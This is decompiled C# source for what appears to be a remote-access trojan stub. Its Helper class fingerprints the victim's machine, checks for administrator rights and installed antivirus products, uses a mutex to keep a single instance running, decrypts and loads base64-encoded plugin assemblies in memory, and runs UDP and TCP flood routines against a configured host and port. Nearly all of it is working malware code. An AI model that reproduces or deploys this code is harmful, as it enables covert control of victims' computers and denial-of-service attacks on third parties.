using System;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Timers;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x0200000B RID: 11
	[StandardModule]
	internal sealed class Helper
	{
		// Token: 0x06000034 RID: 52 RVA: 0x00006454 File Offset: 0x00004654
		public static byte[] SB(string s)
		{
			return Encoding.Default.GetBytes(s);
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00006470 File Offset: 0x00004670
		public static string BS(byte[] b)
		{
			return Encoding.Default.GetString(b);
		}

		// Token: 0x06000036 RID: 54 RVA: 0x0000648C File Offset: 0x0000468C
		public static string ID()
		{
			string result;
			try
			{
				result = Helper.GetHashT(string.Concat(new object[]
				{
					Environment.ProcessorCount,
					Environment.UserName,
					Environment.MachineName,
					Environment.OSVersion,
					new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize
				}));
			}
			catch (Exception ex)
			{
				result = "Err HWID";
			}
			return result;
		}

		// Token: 0x06000037 RID: 55 RVA: 0x0000651C File Offset: 0x0000471C
		public static string GetHashT(string strToHash)
		{
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = Encoding.ASCII.GetBytes(strToHash);
			array = md5CryptoServiceProvider.ComputeHash(array);
			StringBuilder stringBuilder = new StringBuilder();
			foreach (byte b in array)
			{
				stringBuilder.Append(b.ToString("x2"));
			}
			return stringBuilder.ToString().Substring(0, 20).ToUpper();
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00006590 File Offset: 0x00004790
		public static object frombase64(string bs64)
		{
			object result;
			try
			{
				result = Convert.FromBase64String(bs64);
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x06000039 RID: 57 RVA: 0x000065C8 File Offset: 0x000047C8
		public static object objj(string byt)
		{
			return RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Helper.Plugin((byte[])Helper.frombase64(byt), "Class1")));
		}

		// Token: 0x0600003A RID: 58 RVA: 0x000065F8 File Offset: 0x000047F8
		public static object Plugin(byte[] b, string c)
		{
			foreach (Module module in Assembly.Load(b).GetModules())
			{
				foreach (Type type in module.GetTypes())
				{
					if (type.FullName.EndsWith("." + c))
					{
						return module.Assembly.CreateInstance(type.FullName);
					}
				}
			}
			return null;
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00006678 File Offset: 0x00004878
		public static byte[] AES_Encryptor(byte[] input)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] result;
			try
			{
				rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Helper.SB(Settings.KEY));
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
				GC.Collect();
				result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000066F0 File Offset: 0x000048F0
		public static byte[] AES_Decryptor(byte[] input)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] result;
			try
			{
				rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Helper.SB(Settings.KEY));
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				GC.Collect();
				result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00006768 File Offset: 0x00004968
		public static string INDATE()
		{
			string result;
			try
			{
				FileInfo fileInfo = new FileInfo(Settings.path2);
				result = fileInfo.LastWriteTime.ToString("dd/MM/yyy");
			}
			catch (Exception ex)
			{
				result = "Error";
			}
			return result;
		}

		// Token: 0x0600003E RID: 62 RVA: 0x000067C4 File Offset: 0x000049C4
		public static string usbp()
		{
			string result;
			try
			{
				if (Operators.CompareString(Path.GetFileName(Settings.path2), Settings.nameee, false) == 0)
				{
					result = "True";
				}
				else
				{
					result = "False";
				}
			}
			catch (Exception ex)
			{
				result = "Error";
			}
			return result;
		}

		// Token: 0x0600003F RID: 63 RVA: 0x0000682C File Offset: 0x00004A2C
		public static string admin()
		{
			string result;
			try
			{
				object current = WindowsIdentity.GetCurrent();
				object instance = new WindowsPrincipal((WindowsIdentity)current);
				bool flag = Conversions.ToBoolean(NewLateBinding.LateGet(instance, null, "IsInRole", new object[]
				{
					WindowsBuiltInRole.Administrator
				}, null, null, null));
				if (flag)
				{
					result = "True";
				}
				else
				{
					result = "False";
				}
			}
			catch (Exception ex)
			{
				result = "Error";
			}
			return result;
		}

		// Token: 0x06000040 RID: 64 RVA: 0x000068BC File Offset: 0x00004ABC
		public static string Antivirus()
		{
			string result;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
				{
					StringBuilder stringBuilder = new StringBuilder();
					try
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
						{
							stringBuilder.Append(managementBaseObject["displayName"].ToString());
							stringBuilder.Append(",");
						}
					}
					finally
					{
						ManagementObjectCollection.ManagementObjectEnumerator enumerator;
						if (enumerator != null)
						{
							((IDisposable)enumerator).Dispose();
						}
					}
					if (stringBuilder.ToString().Length == 0)
					{
						result = "None";
					}
					else
					{
						result = stringBuilder.ToString().Substring(0, checked(stringBuilder.Length - 1));
					}
				}
			}
			catch (Exception ex)
			{
				result = "None";
			}
			return result;
		}

		// Token: 0x06000041 RID: 65 RVA: 0x000069C0 File Offset: 0x00004BC0
		public static bool CreateMutex()
		{
			bool result;
			Settings._appMutex = new Mutex(false, Settings.Mutexx, ref result);
			return result;
		}

		// Token: 0x06000042 RID: 66 RVA: 0x000069E4 File Offset: 0x00004BE4
		public static void CloseMutex()
		{
			if (Settings._appMutex != null)
			{
				Settings._appMutex.Close();
				Settings._appMutex = null;
			}
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00006A00 File Offset: 0x00004C00
		public static void tickees(object sender, ElapsedEventArgs e)
		{
			checked
			{
				try
				{
					if (Operators.CompareString(Settings.dostype, "UDP", false) == 0)
					{
						for (;;)
						{
							UdpClient udpClient = new UdpClient();
							try
							{
								Random random = new Random();
								byte[] array = new byte[65500];
								int num = 0;
								do
								{
									array[num] = (byte)random.Next(0, 255);
									num++;
								}
								while (num <= 65499);
								IPAddress addr = IPAddress.Parse(Settings.doshost);
								udpClient.Connect(addr, Conversions.ToInteger(Settings.dosport));
								udpClient.Send(array, array.Length);
								udpClient.Close();
								GC.Collect();
							}
							catch (Exception ex)
							{
								udpClient.Close();
								GC.Collect();
								continue;
							}
							break;
						}
					}
					if (Operators.CompareString(Settings.dostype, "TCP", false) == 0)
					{
						try
						{
							IL_B9:
							IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(Settings.doshost), Convert.ToInt32(Settings.dosport));
							Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
							socket.Connect(remoteEP);
							socket.Close();
							GC.Collect();
						}
						catch (Exception ex2)
						{
							goto IL_B9;
						}
					}
				}
				catch (Exception ex3)
				{
				}
			}
		}
	}
}
